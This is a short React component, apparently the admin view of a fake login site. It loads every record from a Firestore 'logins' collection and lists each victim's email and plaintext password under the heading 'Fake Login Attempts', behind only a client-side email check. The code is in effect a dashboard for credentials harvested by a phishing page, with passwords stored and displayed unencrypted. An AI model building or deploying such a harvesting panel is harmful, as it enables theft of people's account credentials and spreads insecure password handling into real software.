// src/Admin/Admin.jsx
import React, { useEffect, useState } from "react";
import { db, auth } from "../firebase";
import { collection, getDocs } from "firebase/firestore";
import { useNavigate } from "react-router-dom";

const Admin = () => {
  const [logins, setLogins] = useState([]);
  const [error, setError] = useState("");
  const navigate = useNavigate();

  useEffect(() => {
    const fetchData = async () => {
      const user = auth.currentUser;
      if (!user || user.email !== "admin@example.com") {
        navigate("/admin-login");
        return;
      }

      try {
        const snapshot = await getDocs(collection(db, "logins"));
        const data = snapshot.docs.map(doc => doc.data());
        setLogins(data);
      } catch (err) {
        setError("Error fetching data: " + err.message);
      }
    };

    fetchData();
  }, [navigate]);

  return (
    <div style={{ padding: "30px" }}>
      <h2>Fake Login Attempts</h2>
      {error && <p style={{ color: "red" }}>{error}</p>}
      {logins.map((entry, index) => (
        <div key={index} style={{ marginBottom: "10px", borderBottom: "1px solid #ccc" }}>
          <p><strong>Email:</strong> {entry.email}</p>
          <p><strong>Password:</strong> {entry.password}</p>
        </div>
      ))}
    </div>
  );
};

export default Admin;
